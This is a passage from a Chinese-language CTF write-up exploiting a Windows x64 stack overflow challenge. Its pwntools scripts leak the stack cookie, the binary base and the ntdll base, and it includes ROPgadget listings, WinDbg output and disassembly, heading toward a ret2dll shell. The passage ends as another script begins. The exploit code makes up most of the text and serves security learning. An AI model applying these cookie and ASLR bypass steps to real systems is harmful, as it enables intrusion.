    ModLoad: 00007ff6`0c4c0000 00007ff6`0c4c7000   Z:\easyoverflow\StackOverflow.exe
    ModLoad: 00007ff8`f3790000 00007ff8`f3b86000   C:\Windows\SYSTEM32\ntdll.dll
    ModLoad: 00007ff8`f1eb0000 00007ff8`f1fa4000   C:\Windows\System32\xtajit64.dll
    ModLoad: 00007ff8`f1020000 00007ff8`f117c000   C:\Windows\System32\KERNEL32.DLL
    ModLoad: 00007ff8`ef810000 00007ff8`efdf9000   C:\Windows\System32\KERNELBASE.dll
    ModLoad: 00007ff8`eedd0000 00007ff8`eeea8000   C:\Windows\SYSTEM32\apphelp.dll
    ModLoad: 00007ff8`ef270000 00007ff8`ef464000   C:\Windows\System32\ucrtbase.dll
    ModLoad: 00007ff8`e6e80000 00007ff8`e6eb5000   C:\Windows\SYSTEM32\VCRUNTIME140.dll
第二行就是binary的地址区间，基地址一样，证明poc正确
接下来需要打返回地址到main函数使得可以继续利用，值得注意的是因为到main函数之后栈会变，所以需要再次泄露出`StackCookie`，poc如下
    from pwn import *
    context.log_level = 'debug'
    li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
    ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')
    #r = remote('10.211.55.3', 1234)
    r = remote('192.168.10.102', 1234)
    #pause()
    p1 = b'a' * 0x100
    r.sendafter('input:', p1)
    r.recvuntil('a' * 0x100)
    StackCookie = u64(r.recv(6).ljust(8, b'\x00'))
    li('StackCookie = ' + hex(StackCookie))
    p2 = b'a' * 0x118
    r.sendafter('input:' ,p2)
    r.recvuntil('a' * 0x118)
    leak_addr = u64(r.recv(6).ljust(8, b'\x00'))
    li('leak_addr = ' + hex(leak_addr))
    binary_base = leak_addr - 0x12F4
    li('binary_base = ' + hex(binary_base))
    main_addr = 0x1000 + binary_base
    p3 = b'a' * 0x100
    p3 += p64(StackCookie)
    p3 += b'a' * 0x10
    p3 += p64(main_addr)
    r.sendafter('input:', p3)
    r.sendafter('input:', p1)
    r.recvuntil('a' * 0x100)
    StackCookie = u64(r.recv(6).ljust(8, b'\x00'))
    li('StackCookie = ' + hex(StackCookie))
### ret2dll
接下来就可以利用ret2dll的方法来getshell，第一步泄露出dll_base，上一节已经学过了利用iat表来泄露出dll_base，但是这个程序是64位的，参数通过寄存器传递，顺序是
`rcx rdx r8 r9`
所以笔者用Ropgadget找了一下发现gadgets很少几乎用不了
    ➜  easyoverflow ROPgadget --binary StackOverflow.exe --only 'pop|ret'
    Gadgets information
    ============================================================
    0x00000001400017ee : pop rbp ; ret
    0x00000001400010c9 : pop rbx ; ret
    0x00000001400014ed : pop rdi ; pop rsi ; pop rbx ; ret
    0x000000014000133d : pop rdi ; ret
    0x00000001400014ee : pop rsi ; pop rbx ; ret
    0x00000001400010ca : ret
    0x0000000140001818 : ret 0
    0x0000000140001723 : ret 0x8348
    0x0000000140001643 : ret 0xb70f
    0x0000000140001678 : ret 0xeb28
    0x0000000140001d12 : ret 3
在CTF
PWN中，可以通过泄露出libc然后用libc的gadgets，但是win下就不一样，因为没有可用的gadgets，所以需要借助ntdll.dll这个dll来寻找可用的gadgets，为什么是ntdll.dll呢，因为在main函数调用之前会调用ntdll.dll，所以可以泄露出这上面的地址，寻找一下
    ModLoad: 00007fff`2da80000 00007fff`2dc89000   C:\WINDOWS\SYSTEM32\ntdll.dll
    0:000> dq rsp + 0x170
    00000010`d33ffb88  61616161`61616161 61616161`61616161
    00000010`d33ffb98  61616161`61616161 61616161`61616161
    00000010`d33ffba8  61616161`61616161 61616161`61616161
    00000010`d33ffbb8  00007fff`2da8485b 00000000`00000000
在`10d33ffba8`这里存放的地址就是ntdll.dll上的地址，算一下偏移在0x180，并且泄露的地址与base偏移为`0x485b`所以构造如下exp
    from pwn import *
    context.log_level = 'debug'
    li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
    ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')
    #r = remote('10.211.55.3', 1234)
    r = remote('192.168.10.102', 1234)
    pause()
    p1 = b'a' * 0x100
    r.sendafter('input:', p1)
    r.recvuntil('a' * 0x100)
    StackCookie = u64(r.recv(6).ljust(8, b'\x00'))
    li('StackCookie = ' + hex(StackCookie))
    p2 = b'a' * 0x118
    r.sendafter('input:' ,p2)
    r.recvuntil('a' * 0x118)
    leak_addr = u64(r.recv(6).ljust(8, b'\x00'))
    li('leak_addr = ' + hex(leak_addr))
    binary_base = leak_addr - 0x12F4
    li('binary_base = ' + hex(binary_base))
    main_addr = 0x1000 + binary_base
    p3 = b'a' * 0x100
    p3 += p64(StackCookie)
    p3 += b'a' * 0x10
    p3 += p64(main_addr)
    r.sendafter('input:', p3)
    r.sendafter('input:', p1)
    r.recvuntil('a' * 0x100)
    StackCookie = u64(r.recv(6).ljust(8, b'\x00'))
    li('StackCookie = ' + hex(StackCookie))
    p4 = b'a' * 0x180
    r.sendafter('input:', p4)
    r.recvuntil('a' * 0x180)
    ntdll_addr = u64(r.recv(6).ljust(8, b'\x00'))
    li('ntdll_addr = ' + hex(ntdll_addr))
    ntdll_base = ntdll_addr - 0x485b
    li('ntdll_base = ' + hex(ntdll_base))
    r.interactive()
输出的地址正确，因为有aslr的存在，所以地址肯定是随机的，这就造成了上面有时候地址不一样，需要注意的是这里笔者换成了实机，因为arm
windows11支持了x64的程序
>
> 相应的x64程序的公用DLL和ARM64程序使用的公用DLL一样都会存放在System32目录下。实际上，原来的ARM64系统DLL都已经进化成ARM64x
> ABI的混合DLL，这些DLL中的机器码主要仍是ARM64
> native的，ARM64程序仍然能以最高效率调用里面导出的函数。同时增加了对x64程序基于JIT指令转译模拟执行时调用相关导出函数的支持，主要是将x64调用约定转换为对相应的ARM64函数的调用，执行结果处理则反之。这样可以提高执行效率，因为如果直接使用自Win10
> x64版本的System32目录复制过来的x64 DLL的话，DLL中的机器码也需要指令转译，从而影响了执行效率。可能有点像Win10 on
> ARM下执行x86程序时调用系统常用的DLL使用SyChpe32中的CHPE DLL以提高执行效率的策略。
    [DEBUG] Received 0x193 bytes:
        00000000  3a 0d 0a 61  61 61 61 61  61 61 61 61  61 61 61 61  │:··a│aaaa│aaaa│aaaa│
        00000010  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
        *
        00000180  61 61 61 5b  48 a8 2d ff  7f 0d 0a 69  6e 70 75 74  │aaa[│H·-·│···i│nput│
        00000190  3a 0d 0a                                            │:··│
        00000193
    ntdll_addr = 0x7fff2da8485b
    ntdll_base = 0x7fff2da80000
拿到ntdll的地址之后寻找需要用的gadgets，也就是能控制rcx的还有rbx，为什么还有个rbx，看下面的汇编
    dec     ebx
    call    memset
    lea     rcx, Buffer     ; "input:"
    call    cs:puts
    mov     r8d, 400h       ; MaxCharCount
    lea     rdx, [rsp+138h+DstBuf] ; DstBuf
    xor     ecx, ecx        ; FileHandle
    call    cs:_read
    lea     rcx, aBuffer    ; "buffer:"
    call    cs:puts
    lea     rcx, [rsp+138h+DstBuf] ; Buffer
    call    cs:puts
    test    ebx, ebx
    jg      short loc_7FF60C4C1060
通过rbx来控制循环次数，所以控制了rbx为1之后就可以继续执行rop，找到gadgets之后就需要构造rop了，在构造rop的时候会发现失败，排查下来可以发现是rsp的原因
    0:000> r
    rax=0000000000000140 rbx=0000000000000000 rcx=00000000ffffffff
    rdx=00000245250cc230 rsi=0000000000000000 rdi=00000245250d0020
    rip=00007ff678e11094 rsp=000000f986aff928 rbp=0000000000000000
     r8=0000000000000140  r9=00007fff2b7909a0 r10=0000000000000000
    r11=000000000000019c r12=0000000000000000 r13=0000000000000000
    r14=0000000000000000 r15=0000000000000000
    iopl=0         nv up ei pl nz na pe nc
    cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
    StackOverflow+0x1094:
    00007ff6`78e11094 488d0dbd110000  lea     rcx,[StackOverflow+0x2258 (00007ff6`78e12258)]
    0:000> g
    Breakpoint 0 hit
    StackOverflow+0x1094:
    00007ff6`78e11094 488d0dbd110000  lea     rcx,[StackOverflow+0x2258 (00007ff6`78e12258)]
    0:000> r
    rax=0000000000000140 rbx=0000000000000000 rcx=00000000ffffffff
    rdx=00000245250cc230 rsi=0000000000000000 rdi=00000245250d0020
    rip=00007ff678e11094 rsp=000000f986affa88 rbp=0000000000000000
     r8=0000000000000140  r9=00007fff2b7909a0 r10=0000000000000000
    r11=000000000000019c r12=0000000000000000 r13=0000000000000000
    r14=0000000000000000 r15=0000000000000000
因为rsp的值改变了，所以最后`check
cookie`会不通过，所以需要重新计算`StackCookie`，也就是泄露出`security_cookie`，再计算出新的rsp（`000000f986affa88
- 000000f986aff928 = 0x160`），所以exp如下
    from pwn import *
    context.log_level = 'debug'
    li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')